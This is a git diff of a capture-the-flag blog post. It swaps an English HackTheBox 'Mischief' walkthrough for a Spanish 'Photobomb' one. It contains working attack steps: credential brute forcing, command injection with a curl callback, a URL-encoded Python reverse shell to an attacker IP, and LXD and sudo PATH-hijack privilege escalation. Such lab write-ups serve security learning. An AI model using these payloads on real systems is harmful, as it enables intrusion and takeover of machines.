@@ -32,291 +32,193 @@ Write Up de la máquina Photobomp, máquina Linux!
 
 ### Nmap
 
-There's only a webserver and the SSH service running on this box
+De primeras lanzaremos un nmap a la máquina para ver que puertos están abiertos.
+
 
 ```
-root@violentunicorn:~/hackthebox/Machines/Mischief# nmap -sC -sV -p- 10.10.10.92
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 18:57 EDT
-Nmap scan report for 10.10.10.92
-Host is up (0.015s latency).
-Not shown: 65533 filtered ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
-|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
-|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
-3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
-| http-auth: 
-| HTTP/1.0 401 Unauthorized\x0D
-|_  Basic realm=Test
-|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
-|_http-title: Site doesn't have a title (text/html).
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.182 -oG allPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-16 16:18 CET
+Initiating SYN Stealth Scan at 16:18
+Scanning 10.10.11.182 [65535 ports]
+Discovered open port 80/tcp on 10.10.11.182
+Discovered open port 22/tcp on 10.10.11.182
+Completed SYN Stealth Scan at 16:19, 10.46s elapsed (65535 total ports)
+Nmap scan report for 10.10.11.182
+Host is up, received user-set (0.035s latency).
+Scanned at 2023-02-16 16:18:56 CET for 10s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 127.89 seconds
-```
-
-### SNMP recon
-
-SNMP is open on UDP port 161
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 10.59 seconds
+           Raw packets sent: 65865 (2.898MB) | Rcvd: 65640 (2.626MB)
 
 ```
-root@violentunicorn:~/hackthebox/Machines/Mischief# nmap -sU -F 10.10.10.92
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 19:07 EDT
-Nmap scan report for 10.10.10.92
-Host is up (0.014s latency).
-Not shown: 99 open|filtered ports
-PORT    STATE SERVICE
-161/udp open  snmp
-
-Nmap done: 1 IP address (1 host up) scanned in 3.03 seconds
-```
-
-SNMP is using the default `public` community string:
+Sabiendo ya los puertos que están abiertos, haremos un escaneo más exhaustivo para detectar el sevicio y la versión que corre através de esos puertos.
 
 ```
-root@violentunicorn:~/hackthebox/Machines/Mischief# onesixtyone 10.10.10.92
-Scanning 1 hosts, 2 communities
-10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
-```
+nmap -sCV -p22,80 10.10.11.182 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-02-16 16:27 CET
+Nmap scan report for 10.10.11.182
+Host is up (0.032s latency).
 
-We can get the list of processes with this nmap script, or by doing an `snmpwalk`:
-
-```
-root@violentunicorn:~/hackthebox/Machines/Mischief# nmap -sU -p 161 --script=snmp-processes 10.10.10.92
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 19:15 EDT
-Nmap scan report for 10.10.10.92
-Host is up (0.014s latency).
-
-PORT    STATE SERVICE
-161/udp open  snmp
-| snmp-processes:
-[...]
-|   631: 
-|     Name: python
-|     Path: python
-|     Params: -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/
-[...]
-```
-
-We found some credentials in there: `loki / godofmischiefisloki`
-
-### Credentials found on the webserver
-
-We can now log in to the webserver with the found credentials:
-
-![Webserver](/assets/images/htb-writeup-mischief/webserver.png)
-
-On the page we see an image of Loki and two sets of credentials:
-
-- loki / godofmischiefisloki
-- loki / trickeryanddeceit
-
-We already have the first one, we need to find where to use the 2nd one.
-
-The `trickeryanddeceit` password doesn't work on SSH (tried bruteforcing usernames also)
-
-### SNMP recon (part 2)
-
-When we do a full snmpwalk, we pickup IPv6 addresses configured on the interface:
-
-```
-root@violentunicorn:~/hackthebox/Machines/Mischief# snmpwalk -v2c -c public 10.10.10.92 1.3.6.1.2.1.4.34.1.3
-iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.92 = INTEGER: 2
-iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.255 = INTEGER: 2
-iso.3.6.1.2.1.4.34.1.3.1.4.127.0.0.1 = INTEGER: 1
-iso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1
-iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.178.24.116 = INTEGER: 2
-iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.178.24.116 = INTEGER: 2
-```
-
-We convert that to hex using a python script:
-
-```
->>> s = "222.173.190.239.0.0.0.0.2.80.86.255.254.178.24.116"
->>> s = s.split(".")
->>> ip = ""
->>> for i in s:
-...     ip += hex(int(i))[2:].rjust(2,'0')
-... 
->>> print ip
-deadbeef00000000025056fffeb21874
-```
-
-IPv6 address: `dead:beef:0000:0000:0250:56ff:feb2:1874`
-
-We'll add this IPv6 address to our `/etc/hosts`.
-
-### Nmap IPv6
-
-There is another webserver running on port 80 but only listening on IPv6 addresses:
-
-```
-root@violentunicorn:~/hackthebox/Machines/Mischief# nmap -6 -sC -sV -p- dead:beef:0000:0000:0250:56ff:feb2:1874
-Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 19:29 EDT
-Nmap scan report for dead:beef::250:56ff:feb2:1874
-Host is up (0.015s latency).
-Not shown: 65533 closed ports
 PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
-|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
-|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
-|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: 400 Bad Request
+|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
+|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
+|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://photobomb.htb/
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Host script results:
-| address-info: 
-|   IPv6 EUI-64: 
-|     MAC address: 
-|       address: 00:50:56:b2:18:74
-|_      manuf: VMware
-
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 19.58 seconds
-```
-
-### Command execution panel
-
-The web server is running a PHP application:
-
-![Command Execution Panel](/assets/images/htb-writeup-mischief/cep1.png)
-
-![Command Execution Panel Login](/assets/images/htb-writeup-mischief/cep2.png)
-
-It's probably using the 2nd password we found but we don't know the username (loki doesn't work here.)
-
-We'll use Hydra to bruteforce the username:
+Nmap done: 1 IP address (1 host up) scanned in 8.03 seconds
 
 ```
-root@violentunicorn:~/hackthebox/Machines/Mischief# hydra -I -L /root/SecLists/Usernames/top_shortlist.txt -p trickeryanddeceit mischief http-post-form "/login.php:user=^USER^&password=^PASS^:credentials do not match"
-Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
-
-Hydra (http://www.thc.org/thc-hydra) starting at 2018-07-08 19:37:12
-[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries (l:11/p:1), ~1 try per task
-[DATA] attacking http-post-form://mischief:80//login.php:user=^USER^&password=^PASS^:credentials do not match
-[80][http-post-form] host: mischief   login: administrator   password: trickeryanddeceit
-1 of 1 target successfully completed, 1 valid password found
-Hydra (http://www.thc.org/thc-hydra) finished at 2018-07-08 19:37:13
-```
-
-Username is: `administrator`
-
-Once logged in we see:
-
-![Command Execution Panel](/assets/images/htb-writeup-mischief/cep3.png)
-
-There's a hint about a credentials file in the home directory.
-
-The command input is filtered (some commands are blacklisted.)
-
-But we can get the credentials with: `ping -c 2 127.0.0.1; cat /home/loki/c*;`
-
-![Password](/assets/images/htb-writeup-mischief/password.png)
-
-Password is `lokiisthebestnorsegod`
-
-We can now SSH with user `loki` and password `lokiisthebestnorsegod`
+Antes de comenzar con la fase de intrusión añadiremos al `/etc/hosts` la siguiente linea
 
 ```
-root@violentunicorn:~/hackthebox/Machines/Mischief# ssh loki@10.10.10.92
-loki@10.10.10.92's password: 
-Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
-
-[...]
-
-loki@Mischief:~$ cat user.txt
-bf5807<redacted>
-```
-
-### Privesc (unintended method)
-
-Our low privilege user is part of the `lxd` group:
+cat /etc/hosts
+# Host addresses
+127.0.0.1  localhost
+127.0.1.1  p4rr0t
+::1        localhost ip6-localhost ip6-loopback
+ff02::1    ip6-allnodes
+ff02::2    ip6-allrouters
+10.10.11.182 photobomb.htb
 
 ```
-loki@Mischief:~$ id
-uid=1000(loki) gid=1004(loki) groups=1004(loki),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),1000(lpadmin),1001(sambashare),1002(debian-tor),1003(libvirtd)
-```
+### Intrusión
 
-So that means we can configure and manage LXC containers on the system.
+Nos dirigimos a la web para visualizar la web.
 
-First, we'll initialize LXD on the box and create a storage pool:
+![paginaWeb](/assets/images/htb-writeup-photobomb/webServer.png)
 
-```
-loki@Mischief:~$ lxd init
-Would you like to use LXD clustering? (yes/no) [default=no]: 
-Do you want to configure a new storage pool? (yes/no) [default=yes]: 
-Name of the new storage pool [default=default]: 
-Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: 
-Create a new BTRFS pool? (yes/no) [default=yes]: 
-Would you like to use an existing block device? (yes/no) [default=no]: 
-Size in GB of the new loop device (1GB minimum) [default=15GB]: 8
-Would you like to connect to a MAAS server? (yes/no) [default=no]: 
-Would you like to create a new network bridge? (yes/no) [default=yes]: no
-Would you like to configure LXD to use an existing bridge or host interface? (yes/no) [default=no]: 
-Would you like LXD to be available over the network? (yes/no) [default=no]: 
-Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
-Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]:
-```
+Vamos a ojear el codigo fuente, a ver si están leakeando algún dato que nos pueda ser útil. Pulsaremos `ctrl+u`
 
-Next, we'll upload a ubuntu container image that we've created on another machine (see: https://dominicbreuker.com/post/htb_calamity/)
+![photobompjs](/assets/images/htb-writeup-photobomb/photobompjs.png)
 
-```
-root@violentunicorn:~/mischief# scp ubuntu.tar.gz loki@10.10.10.92:
-loki@10.10.10.92's password: 
-ubuntu.tar.gz           
-```
+Podemos comprobar que hay un `.js` vamos a ver que hay dentro de este fichero...
 
-Then import it, create a new container out of it, configure it as privileged and mount the local filesystem into it:
+![photobombleakedjs](/assets/images/htb-writeup-photobomb/photobompleakedjs.png)
 
-```
-loki@Mischief:~$ lxc image import ubuntu.tar.gz  --alias yolo
-Image imported with fingerprint: 65d3db52d47d12928e8392004207269d1d8d542024b64e1b2c638a7e1c19e42d
-loki@Mischief:~$ lxc init yolo yolo -c security.privileged=true
-Creating yolo
+Podemos observar que están leakeadas tanto el usuario `pH0t0` como la password `b0Mb!`, credenciales las cuales podemos probar sobre el panel de autenticación de la web.
 
-The container you are starting doesn't have any network attached to it.
-  To create a new network, use: lxc network create
-  To attach a network to a container, use: lxc network attach
+![downloadPhoto](/assets/images/htb-writeup-photobomb/downloadPhoto.png)
 
-loki@Mischief:~$ lxc config device add yolo mydevice disk source=/ path=/mnt/root recursive=true
-Device mydevice added to yolo
-```
+Credenciales válidas, visualizamos ahora una web donde nos permite descargar imágenes. Antes de nada, vamos a abrir `burpsuite` para comprobar que petición se hace por detrás.
 
-Next we start the container and execute a bash shell:
+### Injeccion de comandos
 
-```
-loki@Mischief:~$ lxc config device add yolo mydevice disk source=/ path=/mnt/root recursive=true
-Device mydevice added to yolo
-loki@Mischief:~$ lxc start yolo
-loki@Mischief:~$ lxc exec yolo /bin/bash
-root@yolo:~# cd /mnt/root/root
-root@yolo:/mnt/root/root# ls
-root.txt
-root@yolo:/mnt/root/root# cat root.txt
-The flag is not here, get a shell to find it!
-```
+![Burpsuite](/assets/images/htb-writeup-photobomb/Burpsuite.png)
 
-Looks like the flag is hidden somewhere else...
+Vamos intentar injectar comandos en servidor en el campo `filetype`
 
-Let's find it:
+`photo=almas-salakhov-VK7TCqcZTlw-unsplash.jpg&filetype=jpg;curl+10.10.14.8/example&dimensions=3000x2000`
+
+Vamos a crear un servidor http con `python` que escuche en el puerto `80`
+
+![httpPython](/assets/images/htb-writeup-photobomb/httpPython.png)
+
+Vemos que se ha realizado la petición correctamente, por lo que es vulnerable a injección de comandos, vamos a tratar de crearnos una `rev shell`
+
+### Ejecucion remota de comandos.
+Vamos a injectar un payload, con una `rev shell` como esté que pondré abajo, ya que, he probado varios con `bash` y no funciona, por lo que lo haré con `Python`
+
+`export%20RHOST%3D%2210.10.XX.XX%22%3Bexport%20RPORT%3D443%3Bpython3%20-c%20%27import%20sys%2Csocket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22sh%22%29%27`
+
+Lo mandaremos URL encodeado
+
+Nos ponemos en escucha por el puerto `443`
+
+![ncListen](/assets/images/htb-writeup-photobomb/paDentro.png)
+
+Ya estamos dentro de la máquina! Vamos a realizar un tratamiento de la tty
+
+![tratamientoTty](/assets/images/htb-writeup-photobomb/tratamientoTty.png)
+
+Realizaremos lo siguiente, `python3 -c 'import pty;pty.spawn("/bin/bash")'`. Pulsaremos `ctrl+z`
+Acto seguido con el comando `stty raw -echo; fg` resetearemos la terminal con un `reset xterm`
+
+![IntrusionOK](/assets/images/htb-writeup-photobomb/IntrusionOK.png)
+
+Ya podemos visualizar la primera flag!
+
+### Escalada de privilegios
+
+Vamos con la escalada de privilegios, que en este caso es bastante sencilla.
+
+Observamos con un `sudo -l` los privilegios que tenemos sobre la máquina con el usuario `wizard`
 
 ```
-root@yolo:/mnt/root/root# find /mnt/root -name root.txt 2>/dev/null
-/mnt/root/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
-/mnt/root/root/root.txt
+wizard@photobomb:~/photobomb$ sudo -l
+Matching Defaults entries for wizard on photobomb:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User wizard may run the following commands on photobomb:
+    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+wizard@photobomb:~/photobomb$ 
+
+
+```
+Podemos ejecutar como root el fichero `/opt/cleanup.sh`
+
+Vamos ha mirar el contenido del script...
+
+```
+wizard@photobomb:/opt$ cat cleanup.sh 
+#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log > log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+wizard@photobomb:/opt$
+
+```
+Podemos hacer un PATH Hijacking del binario `find`, el script toma el fichero `photobomb.log` y lo mueve a `photobomb.log.old` y luego usa el truncate para borrar el contenido de `photobomb.log`.
+Al no usar rutas absolutas podemos aprovecharnos del binario `find`
+
+Vamos a crear un fichero con nombre `find` con dentro un `/bin/bash` en la ruta `/dev/shm` por ejemplo...
+
 ```
 
-There's another root.txt, let's see...
+wizard@photobomb:/dev/shm# cat find 
+#!/bin/bash
+
+/bin/bash
+wizard@photobomb:/dev/shm$
+wizard@photobomb:/dev/shm$ ll
+total 4
+drwxrwxrwt  3 root   root     80 Feb 16 17:19 ./
+drwxr-xr-x 18 root   root   3960 Feb 16 10:55 ../
+-rwxr-xr-x  1 wizard wizard   23 Feb 16 17:19 find*
+drwx------  4 root   root     80 Feb 16 10:55 multipath/
+wizard@photobomb:/dev/shm$ chmod +x find
+wizard@photobomb:/dev/shm$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
+root@photobomb:/home/wizard/photobomb# id
+uid=0(root) gid=0(root) groups=0(root)
+root@photobomb:/home/wizard/photobomb#
 
 ```
-root@yolo:/mnt/root/root# cat /mnt/root/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
-ae155f<redacted>
-```
+Ya finalmente podremos visualizar la segunda flag de `root`. GG WP!
 
-Game over!
+![rootFlag](/assets/images/htb-writeup-photobomb/rootFlag.png)
+
+
+Espero a verlo explicado lo mejor posible, cualquier error o sugerencia hacermelo saber! Muchas gracias por leer el write up!
+
+Nos vemos en el siguiente Write Up
